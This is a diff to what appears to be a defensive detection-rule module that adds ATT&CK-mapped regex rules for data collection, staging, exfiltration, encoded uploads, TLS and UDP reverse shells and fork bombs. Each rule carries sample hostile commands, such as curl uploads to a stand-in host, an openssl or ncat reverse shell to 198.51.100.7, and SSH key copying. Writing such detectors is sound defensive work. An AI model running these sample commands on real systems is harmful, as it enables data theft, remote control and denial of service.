@@ -693,6 +693,191 @@ RULES += (
 )
 
 
+# ── collection, staging and exfiltration shape ──────────────────────────────
+# What these see is the command that gathers or moves the data, never the data.
+_DOC_TYPES = r"\*\.(docx?|xlsx?|pptx?|pdf|kdbx|pst|odt|rtf)\b"
+_UPLOAD = (r"(curl(\.exe)?\s([^|;&]*\s)?(-T|--upload-file|-F|--data-binary)\b|rclone(\.exe)?\s+(copy|sync|move)\b"
+           r"|\bscp(\.exe)?\s|\bpscp(\.exe)?\s|bitsadmin(\.exe)?\s[^|;&]*/upload\b|\bwinscp\S*\s"
+           r"|aws(\.exe)?\s+s3\s+(cp|sync|mv)\b|-InFile\b|\.UploadFile\()")
+_KEY_FILES = (r"(\.kdbx\b|\bwallet\.dat\b|[\\/]\.ssh[\\/]id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub)"
+              r"|[\\/]\.aws[\\/]credentials\b|[\\/]\.gnupg[\\/]\S*(secring|private-keys)|\.ppk\b)")
+_STAGING = r"[a-z]:\\(Users\\Public|ProgramData|Windows\\Temp|\$Recycle\.Bin|PerfLogs)\\"
+
+RULES += (
+    _w("T1039", "xcopy robocopy",
+       r"^(\"[^\"]+\"|\S+)\s+\"?\\\\[\w.-]+\\(?!(admin|ipc|[a-z])\$)[^\s\"]+", "low",
+       "files copied from a network share with a copy tool",
+       (S32 + "Robocopy.exe", r"robocopy \\fs01\finance\reports C:\Users\u\AppData\Local\Temp\r /e"),
+       [(S32 + "Robocopy.exe", r"robocopy C:\src D:\backup /mir"),
+        (S32 + "Robocopy.exe", r"robocopy C:\src \\nas\backup\src /mir")]),
+    _l("T1039", "smbget smbclient", r"^\S*smbget\s+\S*smb://|-c\s+[\"'][^\"']*\b(m?get|recurse)\b", "low",
+       "files fetched from a network share with an SMB client",
+       ("/usr/bin/smbclient", "smbclient //fs01/finance -U u -c 'recurse; mget *'"),
+       [("/usr/bin/smbclient", "smbclient -L //fs01 -N")], quiet=True),
+    _w("T1119", "cmd", r"\bfor\s+/r\b.*\(\s*" + _DOC_TYPES + r".*\)\s*do\s+@?(copy|xcopy|move|type)\b", "medium",
+       "one command collecting document files recursively",
+       (S32 + "cmd.exe", r"cmd /c for /r C:\Users %f in (*.docx *.pdf) do copy %f C:\Users\Public\c"),
+       [(S32 + "cmd.exe", r"cmd /c for /r . %f in (*.obj) do del %f")]),
+    _w("T1119", "powershell pwsh",
+       r"\b(Get-ChildItem|gci|ls|dir)\b[^|]*-Recurse\b[^|]*" + _DOC_TYPES
+       + r"[^|]*\|.*\b(Copy-Item|Compress-Archive|Move-Item)\b", "medium",
+       "one command collecting document files recursively",
+       (PS, r"powershell -c Get-ChildItem C:\Users -Recurse -Include *.docx,*.pdf | Copy-Item -Destination C:\t"),
+       [(PS, r"powershell -c Get-ChildItem . -Recurse -Include *.cs | Select-String TODO"),
+        (PS, r"powershell -c Get-ChildItem C:\docs -Recurse -Include *.pdf | Measure-Object")]),
+    _l("T1119", "find",
+       r"-i?name\s+[\"']?" + _DOC_TYPES + r".*-exec\s+(cp|mv|tar|zip|scp|rsync|cat)\b", "medium",
+       "one command collecting document files recursively",
+       ("/usr/bin/find", "find /home -name '*.pdf' -exec cp {} /dev/shm/c ;"),
+       [("/usr/bin/find", "find . -name '*.pyc' -exec rm {} ;"),
+        ("/usr/bin/find", "find /home -name '*.pdf' -newer x")]),
+    _w("T1005", "xcopy robocopy esentutl cmd powershell pwsh",
+       r"\b(copy|xcopy|robocopy|Copy-Item|cpi|esentutl(\.exe)?\s+/y)\b[^|;&]*" + _KEY_FILES, "medium",
+       "private key, password database or wallet file copied with a copy tool",
+       (S32 + "cmd.exe", r"cmd /c copy C:\Users\u\Documents\vault.kdbx C:\Users\Public\v"),
+       [(S32 + "cmd.exe", r"cmd /c copy C:\Users\u\.ssh\id_ed25519.pub C:\t\k"),
+        (S32 + "cmd.exe", r"cmd /c type C:\Users\u\notes.txt")], quiet=True),
+    _l("T1005", "cp tar zip scp rsync 7z", r"[^|;&]*" + _KEY_FILES, "medium",
+       "private key, password database or wallet file copied with a copy tool",
+       ("/usr/bin/cp", "cp /home/u/.ssh/id_ed25519 /dev/shm/k"),
+       [("/usr/bin/cp", "cp /home/u/.ssh/id_ed25519.pub /tmp/k"),
+        ("/usr/bin/cp", "cp /home/u/.ssh/config /tmp/c")], quiet=True),
+    _w("T1029 T1053", "schtasks", r"/create\b.*/tr\s+.*" + _UPLOAD, "high",
+       "scheduled task created whose action uploads data",
+       (S32 + "schtasks.exe",
+        r'schtasks /create /tn Sync /sc hourly /tr "curl.exe -T C:\Users\Public\a.zip https://x.example/u"'),
+       [(S32 + "schtasks.exe", r'schtasks /create /tn Backup /sc daily /tr "C:\Tools\backup.cmd"')], quiet=True),
+    _l("T1029 T1053", " ".join(SHELLS),
+       r"((\*|\d+)(/\d+)?\s+){4}(\*|\d+)\s+[^|\n]*" + _UPLOAD + r"[^\n]*\|\s*crontab\b"
+       r"|systemd-run\b[^|;&]*--on-(calendar|unit-active|boot)\S*\s[^|;&]*" + _UPLOAD, "high",
+       "recurring job created whose action uploads data",
+       ("/usr/bin/bash", "bash -c \"echo '0 * * * * curl -T /tmp/a.tgz https://x.example/u' | crontab -\""),
+       [("/usr/bin/bash", "bash -c \"echo '0 3 * * * /usr/local/bin/backup.sh' | crontab -\"")], quiet=True),
+    _l("T1132", " ".join(SHELLS),
+       r"\b(base64|xxd|uuencode)\b(?!\s+(-d|--decode|-D|-r)\b)[^|;&\\]*\|\s*([^;&\\]*(?<!\\)\|\s*)?(curl|wget|nc|ncat|socat)\s"
+       r"|\b(curl|wget)\b[^|;&]*\$\(\s*(base64|xxd)\b(?!\s+(-d|--decode|-D|-r)\b)", "medium",
+       "data encoded and handed straight to a network tool",
+       ("/usr/bin/bash", "bash -c 'tar cz /home/u/docs | base64 -w0 | curl -d @- https://x.example/p'"),
+       [("/usr/bin/bash", "bash -c 'curl -s https://x.example/k.b64 | base64 -d > k.bin'"),
+        ("/usr/bin/bash", "bash -c 'base64 -w0 logo.png > logo.b64'"),
+        # an alternation in a search pattern is not a pipeline (measured: this fired once)
+        ("/usr/bin/bash", "bash -c 'grep -n \"base64\\|s_client\\|ncat\\|socat\" rules.py | head'")], quiet=True),
+    _w("T1132", "powershell pwsh",
+       r"ToBase64String\b.*\b(Invoke-WebRequest|Invoke-RestMethod|iwr|irm|UploadString|UploadData)\b"
+       r"|\b(Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b[^|;]*ToBase64String\b", "medium",
+       "data encoded and handed straight to a web request",
+       (PS, r"powershell -c $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\t\a.zip')); "
+            r"Invoke-RestMethod https://x.example/p -Method Post -Body $b"),
+       [(PS, r"powershell -c [Convert]::ToBase64String([IO.File]::ReadAllBytes('a.png')) | Set-Content a.b64")],
+       quiet=True),
+    _l("T1573 T1059", " ".join(SHELLS),
+       r"\b(ba|da|z)?sh\b\s+-i\b[^|;]*\|\s*openssl\s+s_client\b|openssl\s+s_client\b[^|;]*\|\s*(/bin/)?(ba|da|z)?sh\b",
+       "high", "interactive shell carried over a TLS client",
+       ("/usr/bin/bash",
+        "bash -c 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 198.51.100.7:443 > /tmp/s'"),
+       [("/usr/bin/bash", "bash -c 'openssl s_client -connect example.com:443 < /dev/null | openssl x509 -noout -dates'")]),
+    _l("T1573 T1059", "ncat nc socat",
+       r"--ssl\b.*(\s-e\b|\s-c\b|--exec\b|--sh-exec\b)|(\s-e\b|\s-c\b|--exec\b|--sh-exec\b).*--ssl\b"
+       r"|OPENSSL:[\w.-]+:\d+.*\b(EXEC|SYSTEM):|\b(EXEC|SYSTEM):.*OPENSSL:[\w.-]+:\d+", "high",
+       "shell handed to a TLS-wrapped network utility",
+       ("/usr/bin/ncat", "ncat --ssl 198.51.100.7 443 -e /bin/bash"),
+       [("/usr/bin/ncat", "ncat --ssl example.com 443")]),
+    _w("T1573 T1059", "ncat", r"--ssl\b.*(\s-e\b|--exec\b|--sh-exec\b)|(\s-e\b|--exec\b|--sh-exec\b).*--ssl\b", "high",
+       "shell handed to a TLS-wrapped network utility",
+       (r"C:\Tools\ncat.exe", "ncat.exe --ssl 198.51.100.7 443 -e cmd.exe"),
+       [(r"C:\Tools\ncat.exe", "ncat.exe --ssl example.com 443")]),
+    _l("T1095 T1059", "nc ncat netcat socat",
+       r"(^|\s)-\w*u\w*\b.*(\s-e\b|\s-c\b|--exec\b|--sh-exec\b)|(\s-e\b|\s-c\b|--exec\b|--sh-exec\b).*\s-\w*u\w*\b"
+       r"|\bUDP[46]?(-\w+)?:\S+.*\b(EXEC|SYSTEM):|\b(EXEC|SYSTEM):.*\bUDP[46]?(-\w+)?:", "high",
+       "shell carried over UDP by a network utility",
+       ("/usr/bin/ncat", "ncat -u 198.51.100.7 53 -e /bin/bash"),
+       [("/usr/bin/nc", "nc -u 192.168.1.1 53"),
+        ("/usr/bin/nc", "nc -zv 192.168.1.1 22")]),
+    _w("T1095 T1059", "nc ncat", r"(^|\s)-\w*u\w*\b.*(\s-e\b|--exec\b)|(\s-e\b|--exec\b).*\s-\w*u\w*\b", "high",
+       "shell carried over UDP by a network utility",
+       (r"C:\Tools\ncat.exe", "ncat.exe -u 198.51.100.7 53 -e cmd.exe"),
+       [(r"C:\Tools\ncat.exe", "ncat.exe -u 192.168.1.1 53")]),
+    _l("T1095", "ptunnel ptunnel-ng icmptunnel icmpsh hans pingtunnel", r"\S", "high",
+       "tunnel-over-ping tool started",
+       ("/usr/sbin/ptunnel-ng", "ptunnel-ng -p 198.51.100.7 -l 2222")),
+    _l("T1499", " ".join(SHELLS), r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:", "high",
+       "fork bomb on a shell command line",
+       ("/usr/bin/bash", "bash -c ':(){ :|:& };:'"),
+       [("/usr/bin/bash", "bash -c 'f(){ echo hi; }; f'")]),
+    _w("T1499", "cmd", r"%0\s*\|\s*%0|\bfor\s+/l\s+%+\w\s+in\s*\(\s*\)\s*do\s+start\b", "high",
+       "fork bomb on a command line",
+       (S32 + "cmd.exe", "cmd /c for /l %i in () do start cmd"),
+       [(S32 + "cmd.exe", "cmd /c for /l %i in (1,1,5) do echo %i")]),
+    _l("T1020 T1567", " ".join(SHELLS),
+       r"\b(for|while)\b[^;]*;\s*do\b[^;]*" + _UPLOAD, "high",
+       "one command looping over files and uploading each",
+       ("/usr/bin/bash", "bash -c 'for f in /home/u/docs/*; do curl -T \"$f\" https://x.example/u/; done'"),
+       [("/usr/bin/bash", "bash -c 'for f in *.c; do gcc -c \"$f\"; done'"),
+        ("/usr/bin/bash", "bash -c 'for u in a b; do curl -s https://x.example/$u; done'")], quiet=True),
+    _l("T1020 T1567", "find", r"-exec\s+(\S*/)?" + _UPLOAD, "high",
+       "one command looping over files and uploading each",
+       ("/usr/bin/find", "find /home/u/docs -type f -exec curl -T {} https://x.example/u/ ;"),
+       [("/usr/bin/find", "find . -name '*.log' -exec gzip {} ;")], quiet=True),
+    _w("T1020 T1567", "powershell pwsh",
+       r"\b(Get-ChildItem|gci|ls|dir)\b[^|]*\|\s*(%|ForEach(-Object)?)\s*\{[^}]*" + _UPLOAD, "high",
+       "one command looping over files and uploading each",
+       (PS, r"powershell -c gci C:\Users\u\Documents | % { Invoke-RestMethod https://x.example/u -Method Put -InFile $_.FullName }"),
+       [(PS, r"powershell -c gci C:\src | % { Write-Output $_.Name }")], quiet=True),
+
+    # Held at claimed by the coverage map (attackmap.HELD says why for each).
+    _w("T1074", "7z 7za 7zr rar winrar", r"\ba\b\s+(-\S+\s+)*\"?" + _STAGING, "low",
+       "archive written into a shared staging directory",
+       (r"C:\Program Files\7-Zip\7z.exe", r"7z a C:\Users\Public\d.7z C:\Users\u\Documents"),
+       [(r"C:\Program Files\7-Zip\7z.exe", r"7z a C:\Users\u\backup\d.7z C:\Users\u\Documents")]),
+    _w("T1074", "powershell pwsh", r"Compress-Archive\b[^|;]*-DestinationPath\s+[\"']?" + _STAGING, "low",
+       "archive written into a shared staging directory",
+       (PS, r"powershell -c Compress-Archive -Path C:\Users\u\Documents -DestinationPath C:\Users\Public\d.zip"),
+       [(PS, r"powershell -c Compress-Archive -Path .\dist -DestinationPath .\dist.zip")]),
+    _l("T1074", "tar zip 7z", r"\s(/dev/shm|/var/tmp)/\.?[\w.-]+\.(tar|tgz|tar\.gz|zip|7z)\b", "low",
+       "archive written into a shared staging directory",
+       ("/usr/bin/tar", "tar czf /dev/shm/.d.tgz /home/u/Documents"),
+       [("/usr/bin/tar", "tar czf /home/u/backup/d.tgz /home/u/Documents")]),
+    _w("T1080", "xcopy cmd powershell pwsh",
+       r"\b(copy|xcopy|Copy-Item|cpi)\b[^|;&]*\.(exe|dll|lnk|scr|bat|cmd|vbs|js|hta|ps1)\b\"?\s+(-Destination\s+)?"
+       r"[\"']?\\\\[\w.-]+\\(?!(admin|ipc|[a-z])\$)", "medium",
+       "program, script or shortcut copied onto a network share",
+       (S32 + "cmd.exe", r"cmd /c copy C:\t\Quarterly.lnk \\fs01\finance\Quarterly.lnk"),
+       [(S32 + "cmd.exe", r"cmd /c copy C:\t\report.pdf \\fs01\finance\report.pdf"),
+        (S32 + "cmd.exe", r"cmd /c copy \\fs01\tools\setup.exe C:\t\setup.exe")]),
+    _w("T1491", "reg", r"\badd\b.*\\Control Panel\\Desktop\b.*/v\s+\"?Wallpaper\b", "low",
+       "desktop wallpaper changed from a command line",
+       (S32 + "reg.exe", r'reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\Public\n.bmp /f'),
+       [(S32 + "reg.exe", r'reg query "HKCU\Control Panel\Desktop" /v Wallpaper')]),
+    _w("T1491", "powershell pwsh",
+       r"Set-ItemProperty\b[^|;]*Control Panel\\Desktop[^|;]*\bWallpaper\b|SystemParametersInfo\b[^;]*\b(0x0*14|20)\b",
+       "low", "desktop wallpaper changed from a command line",
+       (PS, r"powershell -c Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value C:\Users\Public\n.bmp"),
+       [(PS, r"powershell -c Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper")]),
+    _w("T1678", "ping",
+       r"-n\s+(\d{3,}|[3-9]\d)\s+(127\.\d+\.\d+\.\d+|localhost)\b|(127\.\d+\.\d+\.\d+|localhost)\s+-n\s+(\d{3,}|[3-9]\d)\b",
+       "low", "loopback ping used as a long sleep",
+       (S32 + "PING.EXE", "ping -n 120 127.0.0.1"),
+       [(S32 + "PING.EXE", "ping -n 4 127.0.0.1"), (S32 + "PING.EXE", "ping -n 120 192.168.1.1")]),
+    _w("T1497", "wmic powershell pwsh", r"\b(MSAcpi_ThermalZoneTemperature|Win32_Fan)\b", "low",
+       "query for hardware an emulator lacks (thermal zone or fan)",
+       (PS, "powershell -c Get-WmiObject -Namespace root/wmi -Class MSAcpi_ThermalZoneTemperature"),
+       [(PS, "powershell -c Get-WmiObject Win32_Processor")]),
+    Rule(("T1072",), WIN, ("cmd", "powershell", "pwsh", "wscript", "cscript", "mshta"), r"\S", "medium",
+         "a software-deployment agent started a shell",
+         (PS, "powershell -nop -c iex $x"),
+         ((PS, "powershell -c Get-Date"),),
+         parents=("ccmexec", "besclient", "taniumclient", "pdqdeployrunner-1", "pdqdeployrunner-2",
+                  "pdqdeployrunner-3", "pdqdeployrunner-4"),
+         sample_parent=r"C:\Windows\AdminArsenal\PDQDeployRunner\service-1\PDQDeployRunner-1.exe"),
+    _l("T1030", "split", r"(^|\s)(-b\s*\d+|--bytes=\d+)", "low", "file split into fixed-size pieces",
+       ("/usr/bin/split", "split -b 5M /tmp/d.tgz /tmp/d.part"),
+       [("/usr/bin/split", "split -l 1000 access.log part")]),
+    _w("T1030", "7z 7za 7zr rar winrar", r"\ba\b.*\s-v\d+[bkmg]?\b", "low", "archive split into fixed-size volumes",
+       (r"C:\Program Files\7-Zip\7z.exe", r"7z a -v5m C:\t\d.7z C:\Users\u\Documents"),
+       [(r"C:\Program Files\7-Zip\7z.exe", r"7z a C:\t\d.7z C:\Users\u\Documents")]),
+)
+
+
 # ── registry writes (Sysmon event 13) ───────────────────────────────────────
 # The same change whatever made it: reg.exe, PowerShell, an installer or an API
 # call from an implant. A machine only reports these for the keys its Sysmon
@@ -1050,6 +1235,30 @@ SMB_PORTS = ("445", "139")
 # non-zero statuses (no record of that type, timeout) are everyday noise.
 NXDOMAIN = "9003"
 DGA_NAMES = 15          # distinct non-existent names from one process in one window
+
+
+# Programs that run other people's code and seldom open a connection of their
+# own. One of them reaching a public address on a port outside the ordinary
+# ones is how a staged payload calls home on a port chosen to avoid inspection.
+ODD_PORT_IMAGES = ("powershell", "pwsh", "mshta", "wscript", "cscript", "rundll32", "regsvr32",
+                   "certutil", "bitsadmin", "msbuild", "installutil", "regasm", "regsvcs")
+USUAL_PORTS = frozenset(("80", "443", "8080", "8443", "53", "123", "22", "21", "25", "465", "587",
+                         "993", "995", "5985", "5986"))
+
+
+def odd_port(image, dest_ip, dest_port, initiated=None):
+    """True for a script host or system utility connecting out to a public
+    address on an unusual port (T1571). The port is all that is judged: what
+    travels over it is not seen."""
+    import ipaddress
+    if image_base(image) not in ODD_PORT_IMAGES or str(dest_port or "") in USUAL_PORTS:
+        return False
+    if not str(dest_port or "").isdigit() or initiated is False or str(initiated).lower() == "false":
+        return False
+    try:
+        return ipaddress.ip_address(dest_ip or "").is_global
+    except ValueError:
+        return False
 
 
 def outbound_smb(dest_ip, dest_port, initiated=None):
